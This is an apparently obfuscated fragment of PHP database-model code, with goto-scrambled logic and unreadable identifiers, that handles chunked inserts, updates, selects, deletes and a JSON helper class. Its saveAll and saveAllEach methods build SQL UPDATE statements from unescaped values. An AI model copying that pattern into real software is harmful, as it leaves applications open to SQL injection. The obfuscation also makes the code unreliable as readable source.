$d³•Ûäˆµ¯ : array(); goto Aôƒí ÒœÁ; C‡µÂˆ¾Ö´: $Aåô†¥ß¸µ =& $_SERVER[©]; global $in; $CâØ»¢†èä = $this->optionsValue(); goto Aõ¨ŠåÃ¢µ; dëá™óÂØŞ: } protected function checkLength($d‰µèÎ´†, $Bˆ»¤Ûä¼ê = 0, $bÒøˆ÷…Ş” = '') { $aŒİÓÔ©ˆ =& $_SERVER[©]; $Bˆ»¤Ûä¼ê = $Bˆ»¤Ûä¼ê ? $Bˆ»¤Ûä¼ê : 65536; if (!$d‰µèÎ´† || strlen($d‰µèÎ´†) < $Bˆ»¤Ûä¼ê) { return; } $bÒøˆ÷…Ş” = $bÒøˆ÷…Ş” ? $bÒøˆ÷…Ş” . $aŒİÓÔ©ˆ[77] : $aŒİÓÔ©ˆ[43]; show_json($bÒøˆ÷…Ş” . LNG($aŒİÓÔ©ˆ[364]) . "\x28{$Bˆ»¤Ûä¼ê}\51", !1); } protected function metaSet($Dô¢‚´Á‡, $bÂğ‹â­” = null, $d¨ğÄ“…ĞÇ = null) { goto cƒÅñá‚£“; AÇËï„Û‹Ú: if (is_string($bÂğ‹â­”)) { $A Ğ”ÂˆÔ[$bÂğ‹â­”] = $d¨ğÄ“…ĞÇ; } $b”ŸòÚÌƒ¬ = array(); foreach ($A Ğ”ÂˆÔ as $eÎÈáÃ–¬Ş => $b‡Œ§¦íì) { $this->checkLength($b‡Œ§¦íì, !1, $DçÏ¬¬Ê£ß . $eæ±Â¥œšŸ[14] . $eÎÈáÃ–¬Ş); $b”ŸòÚÌƒ¬[] = array($aŸïôìÈ‚â => $Dô¢‚´Á‡, $eæ±Â¥œšŸ[99] => $eÎÈáÃ–¬Ş, $eæ±Â¥œšŸ[368] => $b‡Œ§¦íì); } goto FÅÇ…’åïŒ; d¼ÒÁ¥åî: if (is_null($bÂğ‹â­”)) { return $déåè°åÉƒ->where(array($aŸïôìÈ‚â => $Dô¢‚´Á‡))->delete(); } if (is_null($d¨ğÄ“…ĞÇ) && is_string($bÂğ‹â­”)) { return $déåè°åÉƒ->where($E‘ƒ¦Â‡¬)->delete(); } $A Ğ”ÂˆÔ = is_array($bÂğ‹â­”) ? $bÂğ‹â­” : array(); goto AÇËï„Û‹Ú; cƒÅñá‚£“: $eæ±Â¥œšŸ =& $_SERVER[©]; if (!$this->tableMeta) { return !1; } $aŸïôìÈ‚â = $this->tableMeta[$eæ±Â¥œšŸ[365]]; goto d÷Ç¢İæ¦ƒ; d÷Ç¢İæ¦ƒ: $DçÏ¬¬Ê£ß = $this->tableMeta[$eæ±Â¥œšŸ[366]]; $déåè°åÉƒ = Model($DçÏ¬¬Ê£ß); $E‘ƒ¦Â‡¬ = array($aŸïôìÈ‚â => $Dô¢‚´Á‡, $eæ±Â¥œšŸ[367] => $bÂğ‹â­”); goto d¼ÒÁ¥åî; FÅÇ…’åïŒ: $déåè°åÉƒ->where(array($aŸïôìÈ‚â => $Dô¢‚´Á‡))->addAll($b”ŸòÚÌƒ¬, array(), !0); return !0; goto bÉ©‚¨èù¦; bÉ©‚¨èù¦: } public function metaGet($EÏÚÁ‹àÉõ) { goto CÒÇ®ŞöƒÖ; CÒÇ®ŞöƒÖ: $bÛ£•Í„–« =& $_SERVER[©]; if (!$this->tableMeta) { return array(); } $c‚¼ÕŸÌ = $this->tableMeta[$bÛ£•Í„–«[365]]; goto Cší¹áÜ¯Á; c®„„¨òë: $bº¨İÒãÈ„ = array_to_keyvalue($bº¨İÒãÈ„, $bÛ£•Í„–«[99], $bÛ£•Í„–«[368]); return $bº¨İÒãÈ„; goto cÔ°¦¨ì­ó; Cší¹áÜ¯Á: $c–àÛ‡àÎŸ = Model($this->tableMeta[$bÛ£•Í„–«[366]]); $f»ÑÛÔˆÎ« = array($c‚¼ÕŸÌ => $EÏÚÁ‹àÉõ); $bº¨İÒãÈ„ = $c–àÛ‡àÎŸ->field($bÛ£•Í„–«[369])->where($f»ÑÛÔˆÎ«)->select(); goto c®„„¨òë; cÔ°¦¨ì­ó: } private function checkDataAutoHas($AÖ»ÉÂÀ—º) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $D÷ç³ğ¦³ô) { if (in_array($AÖ»ÉÂÀ—º, explode($_SERVER[©][57], $D÷ç³ğ¦³ô[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$BíŒÓ¾ã„, $cØâŒØ´ìæ) { $a…“Ú­ßÉÊ =& $_SERVER[©]; foreach ($this->dataAuto as $fğİ£ååÂƒ) { $eŠÂõ‹÷ÚÖ = $fğİ£ååÂƒ[0]; if (!in_array($cØâŒØ´ìæ, explode($a…“Ú­ßÉÊ[57], $fğİ£ååÂƒ[2]))) { continue; } switch (trim($fğİ£ååÂƒ[3])) { case $a…“Ú­ßÉÊ[318]: case $a…“Ú­ßÉÊ[319]: $b´ğ‚È¿³‹ = $fğİ£ååÂƒ[1]; $Fñó«Ò¯” = isset($fğİ£ååÂƒ[4]) ? (array) $fğİ£ååÂƒ[4] : array(); if ($b´ğ‚È¿³‹ == $a…“Ú­ßÉÊ[200] && array_key_exists($eŠÂõ‹÷ÚÖ, $BíŒÓ¾ã„)) { if (!$BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ]) { unset($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ]); } break; } if (isset($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ])) { array_unshift($Fñó«Ò¯”, $BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ]); } if ($a…“Ú­ßÉÊ[318] == $fğİ£ååÂƒ[3]) { $BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ] = call_user_func_array($b´ğ‚È¿³‹, $Fñó«Ò¯”); } else { $BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ] = call_user_func_array(array(&$this, $b´ğ‚È¿³‹), $Fñó«Ò¯”); } break; case $a…“Ú­ßÉÊ[270]: $BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ] = $BíŒÓ¾ã„[$fğİ£ååÂƒ[1]]; break; case $a…“Ú­ßÉÊ[291]: if (isset($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ]) && !is_string($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ])) { $BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ] = json_encode_force($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ]); } break; case $a…“Ú­ßÉÊ[320]: if ($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ] === $a…“Ú­ßÉÊ[43]) { unset($BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ]); } break; case $a…“Ú­ßÉÊ[321]: $BíŒÓ¾ã„[$eŠÂõ‹÷ÚÖ] = $fğİ£ååÂƒ[1]; default: break; } } if ($cØâŒØ´ìæ == $a…“Ú­ßÉÊ[353]) { $cŠ”­´ùÌ½ = strtolower($this->db->getDbType()); if (strpos($cŠ”­´ùÌ½, $a…“Ú­ßÉÊ[19]) !== 0) { return; } $bº¥Àã¹Í = $this->field(!0)->fields; $c‰Å©¶•Ù = $bº¥Àã¹Í[$a…“Ú­ßÉÊ[249]]; if (isset($bº¥Àã¹Í[$a…“Ú­ßÉÊ[248]])) { unset($c‰Å©¶•Ù[$bº¥Àã¹Í[$a…“Ú­ßÉÊ[248]]]); } foreach ($c‰Å©¶•Ù as $D†£ÓÎ¸Ÿí => $cØâŒØ´ìæ) { if (!isset($BíŒÓ¾ã„[$D†£ÓÎ¸Ÿí])) { $BíŒÓ¾ã„[$D†£ÓÎ¸Ÿí] = $a…“Ú­ßÉÊ[43]; } } } } private function dataAfterFilter(&$eĞùÂ•õ‰‹) { $c ËñªÀÍ =& $_SERVER[©]; foreach ($this->dataAuto as $B«›ã§…) { $EÏèºƒß¬í = $B«›ã§…[0]; if (!in_array($c ËñªÀÍ[355], explode($c ËñªÀÍ[57], $B«›ã§…[2]))) { continue; } if (!isset($eĞùÂ•õ‰‹[$EÏèºƒß¬í])) { continue; } switch (trim($B«›ã§…[3])) { case $c ËñªÀÍ[318]: case $c ËñªÀÍ[319]: $D°£–‹–Ü‰ = isset($B«›ã§…[4]) ? (array) $B«›ã§…[4] : array(); array_unshift($D°£–‹–Ü‰, $eĞùÂ•õ‰‹[$EÏèºƒß¬í]); if ($c ËñªÀÍ[318] == $B«›ã§…[3]) { $eĞùÂ•õ‰‹[$EÏèºƒß¬í] = call_user_func_array($B«›ã§…[1], $D°£–‹–Ü‰); } else { $eĞùÂ•õ‰‹[$EÏèºƒß¬í] = call_user_func_array(array(&$this, $B«›ã§…[1]), $D°£–‹–Ü‰); } break; case $c ËñªÀÍ[270]: $eĞùÂ•õ‰‹[$EÏèºƒß¬í] = $eĞùÂ•õ‰‹[$B«›ã§…[1]]; break; case $c ËñªÀÍ[291]: $A¼Õ÷°ºÇ° = $eĞùÂ•õ‰‹[$EÏèºƒß¬í]; $eĞùÂ•õ‰‹[$EÏèºƒß¬í] = json_decode($A¼Õ÷°ºÇ°, !0); if (is_null($eĞùÂ•õ‰‹[$EÏèºƒß¬í])) { $eĞùÂ•õ‰‹[$EÏèºƒß¬í] = $A¼Õ÷°ºÇ°; } break; case $c ËñªÀÍ[320]: if ($eĞùÂ•õ‰‹[$EÏèºƒß¬í] === $c ËñªÀÍ[43]) { unset($eĞùÂ•õ‰‹[$EÏèºƒß¬í]); } break; case $c ËñªÀÍ[321]: $eĞùÂ•õ‰‹[$EÏèºƒß¬í] = $B«›ã§…[1]; default: break; } } } public function saveAll($D ®´¬…ÈØ) { goto DÆ·ßæ¨òº; DÆ·ßæ¨òº: $eèŞ„•­ =& $_SERVER[©]; $aå¯Ã¸ˆ = $this->tablePrefix . $this->tableName; $d‰‚†èÏÖÔ = self::SQL_WHERE_IN_CHUNK; goto cèÊÒê¿È; bîã•”•â¡: $BÄª†¨Û® = array(); $dİß¼ÇÏ…î = count($D ®´¬…ÈØ); for ($FÈàÂ¢¬ = 0; $FÈàÂ¢¬ < $dİß¼ÇÏ…î; $FÈàÂ¢¬++) { $cÆˆ¼Êˆ«© = $D ®´¬…ÈØ[$FÈàÂ¢¬]; if (!is_array($cÆˆ¼Êˆ«©) || count($cÆˆ¼Êˆ«©) != 4) { continue; } $fã¼’ëğ™ç = "\125\120\104\101\x54\105\x20\x60{$aå¯Ã¸ˆ}\140\x20\x53\105\x54\x20{$cÆˆ¼Êˆ«©[2]}\x20\x3d\x20\103\x41\123\x45\x20{$cÆˆ¼Êˆ«©[0]}\x20\12"; if ($EÎƒÍáÎ† == 0) { $f¬†ëß¸‚ = $fã¼’ëğ™ç; } $BÄª†¨Û®[] = $eèŞ„•­[123] . $cÆˆ¼Êˆ«©[1] . $eèŞ„•­[123]; $EÎƒÍáÎ†++; $f¬†ëß¸‚ .= "\40\127\110\x45\x4e\40\47{$cÆˆ¼Êˆ«©[1]}\x27\x20\x54\x48\105\x4e\x20\x27{$cÆˆ¼Êˆ«©[3]}\x27\x20\12"; if ($EÎƒÍáÎ† == $d‰‚†èÏÖÔ || $FÈàÂ¢¬ == $dİß¼ÇÏ…î - 1) { goto D›£³Ñ¬îÖ; B¢„³¦¤Œ: $BÄª†¨Û® = array(); goto D®Ü”¹±Î; D›£³Ñ¬îÖ: $Eñ‹õÃ—ËÓ = implode($eèŞ„•­[57], $BÄª†¨Û®); $f¬†ëß¸‚ .= "\x20\105\116\104\40\40\127\110\x45\122\x45\x20{$cÆˆ¼Êˆ«©[0]}\x20\x49\116\x20\x28{$Eñ‹õÃ—ËÓ}\51\40"; $this->execute($f¬†ëß¸‚); goto Cšİ—ÀÇİÍ; Cšİ—ÀÇİÍ: $EÎƒÍáÎ† = 0; $f¬†ëß¸‚ = $fã¼’ëğ™ç; $this->chunkEventCheck(count($BÄª†¨Û®)); goto B¢„³¦¤Œ; D®Ü”¹±Î: } } goto F‰½‡Á¼×; cèÊÒê¿È: $D ®´¬…ÈØ = is_array($D ®´¬…ÈØ) ? $D ®´¬…ÈØ : array(); $f¬†ëß¸‚ = $eèŞ„•­[13]; $EÎƒÍáÎ† = 0; goto bîã•”•â¡; F‰½‡Á¼×: $this->chunkEventSet(); goto Aéíó…ÚŒº; Aéíó…ÚŒº: } public function saveAllEach($FÒñéä´¸) { $D¸é”«’İÅ =& $_SERVER[©]; $a±¶¬ÔÈÎª = $this->tablePrefix . $this->tableName; foreach ($FÒñéä´¸ as $Cã˜µå÷äÛ) { if (!is_array($Cã˜µå÷äÛ) || count($Cã˜µå÷äÛ) != 4) { continue; } $Cª‘ÈÛŒ“æ = $Cã˜µå÷äÛ[0] . $D¸é”«’İÅ[370] . $Cã˜µå÷äÛ[1] . $D¸é”«’İÅ[123]; $FÓ¡Ş—Ã†© = $Cã˜µå÷äÛ[2] . $D¸é”«’İÅ[370] . $Cã˜µå÷äÛ[3] . $D¸é”«’İÅ[123]; $c±Ò‰ÃçŸŒ = "\x75\160\144\141\164\x65\x20{$a±¶¬ÔÈÎª}\x20\x73\145\x74\40{$FÓ¡Ş—Ã†©}\x20\167\x68\x65\x72\145\x20{$Cª‘ÈÛŒ“æ}\73"; $this->execute($c±Ò‰ÃçŸŒ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e×ÓÛƒĞ‰† = false, $eï‘ÏÚè„¨ = false) { $this->_chunkEvent = $e×ÓÛƒĞ‰†; $this->_chunkEventParam = $eï‘ÏÚè„¨; } private function chunkEventCheck($f™éôóÃ»ö) { if (!$this->_chunkEvent) { return; } $F‹¦ö£„ô™ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F‹¦ö£„ô™[$_SERVER[©][371]] = $f™éôóÃ»ö; Hook::trigger($this->_chunkEvent, $F‹¦ö£„ô™); } public function addAll($Aù“ŠÜ¬, $Aù¯ƒÛ‡’ = array(), $Dİô¨ÄË„» = false) { goto Eœ’Ù¡Š…¡; eÖÍ¨ÒÜÒ: if (empty($Aù“ŠÜ¬)) { $this->error = think_lang($aŠƒ‚ˆ¶‹ô[268]); return !1; } $Aù¯ƒÛ‡’ = $this->_parseOptions($Aù¯ƒÛ‡’); foreach ($Aù“ŠÜ¬ as $Bì„áÊîäµ => $a›íôÈÊ¯) { $Aù“ŠÜ¬[$Bì„áÊîäµ] = $this->_facade($a›íôÈÊ¯); $this->_beforeInsert($Aù“ŠÜ¬[$Bì„áÊîäµ], $Aù¯ƒÛ‡’); } goto DÊµ‹ÆœÚ¦; Eœ’Ù¡Š…¡: $aŠƒ‚ˆ¶‹ô =& $_SERVER[©]; ignore_timeout(); $a‰Ç×Ñ¾’µ = self::SQL_WHERE_IN_CHUNK; goto eÖÍ¨ÒÜÒ; DÊµ‹ÆœÚ¦: if (method_exists($this->db, $aŠƒ‚ˆ¶‹ô[269])) { for ($dÅ—‘¼¸‘ = 0; $dÅ—‘¼¸‘ < count($Aù“ŠÜ¬); $dÅ—‘¼¸‘ += $a‰Ç×Ñ¾’µ) { $FÏ÷‹¢çÜµ = array_slice($Aù“ŠÜ¬, $dÅ—‘¼¸‘, $a‰Ç×Ñ¾’µ); if (!is_array($FÏ÷‹¢çÜµ) || count($FÏ÷‹¢çÜµ) == 0) { break; } $c¸Ëë¯ = $this->db->insertAll($FÏ÷‹¢çÜµ, $Aù¯ƒÛ‡’, $Dİô¨ÄË„»); $this->chunkEventCheck(count($FÏ÷‹¢çÜµ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Aù“ŠÜ¬ as $Bì„áÊîäµ => $a›íôÈÊ¯) { $c¸Ëë¯ = $this->db->insert($a›íôÈÊ¯, $Aù¯ƒÛ‡’, $Dİô¨ÄË„»); } $this->commit(); } if (!1 !== $c¸Ëë¯) { $FƒÈš÷‘¢ = $this->getLastInsID(); if ($FƒÈš÷‘¢) { return $FƒÈš÷‘¢; } } return $c¸Ëë¯; goto f…–Â…äïñ; f…–Â…äïñ: } public function save($cŞœ»†çß¯ = '', $cÜ¹Í¼¤õ” = array()) { goto EÈ×™ãÎ¢Å; dö­¹”Çİ: $B¥â¸Ÿİ÷Ş = $C¾âğƒ‚èç[$CÌë¢­ï‰Ø[272]][$CÃùŠ×µÈ][1]; $B¥â¸Ÿİ÷Ş = is_array($B¥â¸Ÿİ÷Ş) ? $B¥â¸Ÿİ÷Ş : array(); $AØœõñ±ö = count($B¥â¸Ÿİ÷Ş); goto E¨ÏÆÎÂº¡; Bç™êÆ¸æ¿: $CÃùŠ×µÈ = $this->findWhereField($C¾âğƒ‚èç); if (!$CÃùŠ×µÈ) { return parent::save($cŞœ»†çß¯, $cÜ¹Í¼¤õ”); } $B‚·ãØäó¥ = 0; goto dö­¹”Çİ; E¨ÏÆÎÂº¡: for ($CİµĞ“•ù = 0; $CİµĞ“•ù < $AØœõñ±ö; $CİµĞ“•ù += $a…¾±µÔ¥£) { $f†¥Êî‚Æè = array_slice($B¥â¸Ÿİ÷Ş, $CİµĞ“•ù, $a…¾±µÔ¥£); if (!is_array($f†¥Êî‚Æè) || count($f†¥Êî‚Æè) == 0) { break; } $C¾âğƒ‚èç[$CÌë¢­ï‰Ø[272]][$CÃùŠ×µÈ][1] = $f†¥Êî‚Æè; $this->optionsValue($C¾âğƒ‚èç); $B‚·ãØäó¥ += parent::save($cŞœ»†çß¯, $cÜ¹Í¼¤õ”); $this->chunkEventCheck(count($f†¥Êî‚Æè)); } $this->chunkEventSet(); return $B‚·ãØäó¥; goto e¼¶Ë»µ›Œ; EÈ×™ãÎ¢Å: $CÌë¢­ï‰Ø =& $_SERVER[©]; $a…¾±µÔ¥£ = self::SQL_WHERE_IN_CHUNK; $C¾âğƒ‚èç = $this->optionsValue(); goto Bç™êÆ¸æ¿; e¼¶Ë»µ›Œ: } public function add($BÈïù¼·Œ = '', $F¤ñ‰¡Ò°ğ = array(), $b’¤’Ì‹—› = false) { if ($this->addTaskStatus && is_array($BÈïù¼·Œ)) { $this->addTaskData[] = $BÈïù¼·Œ; return; } return parent::add($BÈïù¼·Œ, $F¤ñ‰¡Ò°ğ, $b’¤’Ì‹—›); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($BŞ¬ÕÎ£Ë¡ = array()) { goto b£•èáÅ¶ù; AĞ«áõ­á: $Bøá‰Âöïù = is_array($Bøá‰Âöïù) ? $Bøá‰Âöïù : array(); $BÔ¨ëê•…ô = null; for ($eÂËğ±†à˜ = 0; $eÂËğ±†à˜ < count($Bøá‰Âöïù); $eÂËğ±†à˜ += $C¼š‹ˆÎ³’) { $A×¸‡ùÍš = array_slice($Bøá‰Âöïù, $eÂËğ±†à˜, $C¼š‹ˆÎ³’); if (!is_array($A×¸‡ùÍš) || count($A×¸‡ùÍš) == 0) { break; } $eöµ¸²£Ü[$bšÆÆ™†çˆ[272]][$C…±­Š¦«][1] = $A×¸‡ùÍš; $this->optionsValue($eöµ¸²£Ü); $a¼Éä†ƒ­¥ = parent::select($BŞ¬ÕÎ£Ë¡); if (!$a¼Éä†ƒ­¥) { continue; } if (is_null($BÔ¨ëê•…ô)) { $BÔ¨ëê•…ô = array(); } $BÔ¨ëê•…ô = array_merge($BÔ¨ëê•…ô, $a¼Éä†ƒ­¥); } goto f›ÂÇ‰âİÕ; fÀ’ÄŞ»ÂÌ: $C…±­Š¦« = $this->findWhereField($eöµ¸²£Ü); if (!$C…±­Š¦« || isset($eöµ¸²£Ü[$bšÆÆ™†çˆ[289]]) || isset($eöµ¸²£Ü[$bšÆÆ™†çˆ[349]])) { return parent::select($BŞ¬ÕÎ£Ë¡); } $Bøá‰Âöïù = $eöµ¸²£Ü[$bšÆÆ™†çˆ[272]][$C…±­Š¦«][1]; goto AĞ«áõ­á; f›ÂÇ‰âİÕ: return $BÔ¨ëê•…ô; goto aÇ¤÷âí¾; b£•èáÅ¶ù: $bšÆÆ™†çˆ =& $_SERVER[©]; $C¼š‹ˆÎ³’ = self::SQL_WHERE_IN_CHUNK; $eöµ¸²£Ü = $this->optionsValue(); goto fÀ’ÄŞ»ÂÌ; aÇ¤÷âí¾: } public function delete($Fß›ºÁ°×Ô = array()) { goto B÷µ—‡Äë„; D³ÇÙæµ¾ : return $Bíºßøêº; goto eŒîšìêÀª; b¢ÚòÍ…Ì: $f‘ŠäË¡™› = $Aé•©ğÇ©Ô[$AÜ…ÜÙ‡—[272]][$AØ§»¿–ô«][1]; $f‘ŠäË¡™› = is_array($f‘ŠäË¡™›) ? $f‘ŠäË¡™› : array(); for ($F…Ô„—Ÿ¦® = 0; $F…Ô„—Ÿ¦® < count($f‘ŠäË¡™›); $F…Ô„—Ÿ¦® += $FÕ»ÔÔµ«¨) { $aëÇÂÈ¦ÍÄ = array_slice($f‘ŠäË¡™›, $F…Ô„—Ÿ¦®, $FÕ»ÔÔµ«¨); if (!is_array($aëÇÂÈ¦ÍÄ) || count($aëÇÂÈ¦ÍÄ) == 0) { break; } $Aé•©ğÇ©Ô[$AÜ…ÜÙ‡—[272]][$AØ§»¿–ô«][1] = $aëÇÂÈ¦ÍÄ; $this->optionsValue($Aé•©ğÇ©Ô); $Bíºßøêº += parent::delete($Fß›ºÁ°×Ô); } goto D³ÇÙæµ¾ ; B÷µ—‡Äë„: $AÜ…ÜÙ‡— =& $_SERVER[©]; $FÕ»ÔÔµ«¨ = self::SQL_WHERE_IN_CHUNK; $Aé•©ğÇ©Ô = $this->optionsValue(); goto a‚„×¾µƒ·; a‚„×¾µƒ·: $AØ§»¿–ô« = $this->findWhereField($Aé•©ğÇ©Ô); if (!$AØ§»¿–ô«) { return parent::delete($Fß›ºÁ°×Ô); } $Bíºßøêº = 0; goto b¢ÚòÍ…Ì; eŒîšìêÀª: } private function findWhereField($fÜĞµ®Ûëæ) { $eÌ³÷ééƒÖ =& $_SERVER[©]; $aîºø÷‡éÆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($fÜĞµ®Ûëæ) || !is_array($fÜĞµ®Ûëæ[$eÌ³÷ééƒÖ[272]])) { return !1; } foreach ($fÜĞµ®Ûëæ[$eÌ³÷ééƒÖ[272]] as $B‡Ë™Ôë¯™ => $dÊê¾¥«‡) { if (is_array($dÊê¾¥«‡) && isset($dÊê¾¥«‡[0]) && is_string($dÊê¾¥«‡[0]) && strtolower($dÊê¾¥«‡[0]) == $eÌ³÷ééƒÖ[17] && is_array($dÊê¾¥«‡[1]) && count($dÊê¾¥«‡[1]) > $aîºø÷‡éÆ) { ignore_timeout(); return $B‡Ë™Ôë¯™; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\145\155\117\x70\164\151\157\156"; public $field = array(); public function listData($d«Óöã¹† = false, $Dïà©Å«µ´ = "\155\x6f\x64\x69\x66\171\124\x69\155\x65", $A…¥ôÍÃÖä = false) { $C‡âÌ²š = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$C‡âÌ²š) { return $d«Óöã¹† ? null : array(); } if (!$d«Óöã¹†) { $C‡âÌ²š = array_filter(array_values($C‡âÌ²š)); return array_sort_by($C‡âÌ²š, $Dïà©Å«µ´, $A…¥ôÍÃÖä); } return $C‡âÌ²š[$_SERVER[©][372] . $d«Óöã¹†]; } public function insert($f×›Ğ¾ï¸) { goto A‹¸¡öÈŠë; CÔŠ×¢‚˜ò: return $a„† íŒŠà; goto aßõ ˆ¸‹¾; A‹¸¡öÈŠë: $e»öÆéÌ‡® =& $_SERVER[©]; $f×›Ğ¾ï¸ = array_field_key($f×›Ğ¾ï¸, $this->field); $a„† íŒŠà = Model($this->modelType)->get($e»öÆéÌ‡®[373], $this->optionType . $e»öÆéÌ‡®[374]); goto FË¶›Ô™Üğ; FË¶›Ô™Üğ: $a„† íŒŠà = $a„† íŒŠà ? $a„† íŒŠà : 0; $f×›Ğ¾ï¸[$e»öÆéÌ‡®[375]] = ++$a„† íŒŠà; $f×›Ğ¾ï¸[$e»öÆéÌ‡®[197]] = time(); goto eğ­‰Éï; eğ­‰Éï: $f×›Ğ¾ï¸[$e»öÆéÌ‡®[117]] = time(); Model($this->modelType)->set($e»öÆéÌ‡®[373], $a„† íŒŠà, $this->optionType . $e»öÆéÌ‡®[374]); Model($this->modelType)->set($e»öÆéÌ‡®[372] . $a„† íŒŠà, $f×›Ğ¾ï¸, $this->optionType); goto CÔŠ×¢‚˜ò; aßõ ˆ¸‹¾: } public function update($a­¡‡šĞ„, $bŒâãë¤ÄÊ) { goto CÚÈ›˜¼Œ˜; ağ†ÈøÑĞÏ: if (!$FˆóŠø„È‹) { return !1; } $bŒâãë¤ÄÊ = array_merge($FˆóŠø„È‹, $bŒâãë¤ÄÊ); $bŒâãë¤ÄÊ[$d±Ä¾ëÏ…¦[117]] = time(); goto E¼ ©™àïÊ; CÚÈ›˜¼Œ˜: $d±Ä¾ëÏ…¦ =& $_SERVER[©]; $bŒâãë¤ÄÊ = array_field_key($bŒâãë¤ÄÊ, $this->field); $FˆóŠø„È‹ = $this->listData($a­¡‡šĞ„); goto ağ†ÈøÑĞÏ; E¼ ©™àïÊ: return Model($this->modelType)->set($d±Ä¾ëÏ…¦[372] . $a­¡‡šĞ„, $bŒâãë¤ÄÊ, $this->optionType); goto aØšøíƒ‚; aØšøíƒ‚: } public function remove($F‘¸Á¼àê) { return Model($this->modelType)->remove($_SERVER[©][372] . $F‘¸Á¼àê, $this->optionType); } public function clear() { $f´¼ÄÜçÕ =& $_SERVER[©]; Model($this->modelType)->remove($f´¼ÄÜçÕ[373], $this->optionType . $f´¼ÄÜçÕ[374]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($f‚†¬¬Æ¢§, $b•Š‹„©) { if (!$b•Š‹„©) { return !1; } $AçÛãâë…Ù = $this->listData(); $AçÛãâë…Ù = array_to_keyvalue($AçÛãâë…Ù, $f‚†¬¬Æ¢§); return isset($AçÛãâë…Ù[$b•Š‹„©]) ? $AçÛãâë…Ù[$b•Š‹„©] : !1; } public function findByName($F¤â‹¢ˆ‡›) { return $this->findByKey($_SERVER[©][38], $F¤â‹¢ˆ‡›); } protected function resetData($eéŠ¸á‡õ) { $aá”±îÊåƒ =& $_SERVER[©]; $eéŠ¸á‡õ = is_array($eéŠ¸á‡õ) ? $eéŠ¸á‡õ : array(); $D¼È¿‘ê = array(); for ($E´Ä ¨“ßÄ = 0; $E´Ä ¨“ßÄ < count($eéŠ¸á‡õ); $E´Ä ¨“ßÄ++) { $D¼È¿‘ê[$aá”±îÊåƒ[372] . $eéŠ¸á‡õ[$E´Ä ¨“ßÄ][$aá”±îÊåƒ[375]]] = $eéŠ¸á‡õ[$E´Ä ¨“ßÄ]; } return Model($this->modelType)->set($D¼È¿‘ê, !1, $this->optionType); } private function getAutoName($CŞÉ×¢–´¢) { $C ¤Äº’Ô‰ = array_to_keyvalue($this->listData(), $_SERVER[©][38]); if (!$C ¤Äº’Ô‰ || !isset($C ¤Äº’Ô‰[$CŞÉ×¢–´¢])) { return $CŞÉ×¢–´¢; } for ($a‹±Ù¦›¹Ğ = 1; $a‹±Ù¦›¹Ğ < count($C ¤Äº’Ô‰); $a‹±Ù¦›¹Ğ++) { $f•Å³ôÄÈª = $CŞÉ×¢–´¢ . "\x28{$a‹±Ù¦›¹Ğ}\51"; if (!isset($C ¤Äº’Ô‰[$f•Å³ôÄÈª])) { return $f•Å³ôÄÈª; } } return $f•Å³ôÄÈª; } } goto e²ºŠäŠ©; FáË—¬¡Á: class Services_JSON { function __construct($Fì¾îÙ¾™ö = 0) { $this->use = $Fì¾îÙ¾™ö; } function utf162utf8($B‡ÆÈ†‰óí) { $fæë‹˜õ  =& $_SERVER[©]; if (function_exists($fæë‹˜õ [78])) { return mb_convert_encoding($B‡ÆÈ†‰óí, $fæë‹˜õ [1587], $fæë‹˜õ [1936]); } $aß‹Æ–É™½ = ord($B‡ÆÈ†‰óí[0]) << 8 | ord($B‡ÆÈ†‰óí[1]); switch (!0) { case (127 & $aß‹Æ–É™½) == $aß‹Æ–É™½: return chr(127 & $aß‹Æ–É™½); case (2047 & $aß‹Æ–É™½) == $aß‹Æ–É™½: return chr(192 | $aß‹Æ–É™½ >> 6 & 31) . chr(128 | $aß‹Æ–É™½ & 63); case (65535 & $aß‹Æ–É™½) == $aß‹Æ–É™½: return chr(224 | $aß‹Æ–É™½ >> 12 & 15) . chr(128 | $aß‹Æ–É™½ >> 6 & 63) . chr(128 | $aß‹Æ–É™½ & 63); } return $fæë‹˜õ [43]; } function utf82utf16($eÙä‰Š‡‰) { $D®°½¢¦™ =& $_SERVER[©]; if (function_exists($D®°½¢¦™[78])) { return mb_convert_encoding($eÙä‰Š‡‰, $D®°½¢¦™[1936], $D®°½¢¦™[1587]); } switch (strlen($eÙä‰Š‡‰)) { case 1: return $eÙä‰Š‡‰; case 2: return chr(7 & ord($eÙä‰Š‡‰[0]) >> 2) . chr(192 & ord($eÙä‰Š‡‰[0]) << 6 | 63 & ord($eÙä‰Š‡‰[1])); case 3: return chr(240 & ord($eÙä‰Š‡‰[0]) << 4 | 15 & ord($eÙä‰Š‡‰[1]) >> 2) . chr(192 & ord($eÙä‰Š‡‰[1]) << 6 | 127 & ord($eÙä‰Š‡‰[2])); } return $D®°½¢¦™[43]; } function encode($b“ß¤ßÍ³Õ) { $bİ–ñÛ«Æ =& $_SERVER[©]; switch (gettype($b“ß¤ßÍ³Õ)) { case $bİ–ñÛ«Æ[1598]: return $b“ß¤ßÍ³Õ ? $bİ–ñÛ«Æ[1597] : $bİ–ñÛ«Æ[1599]; 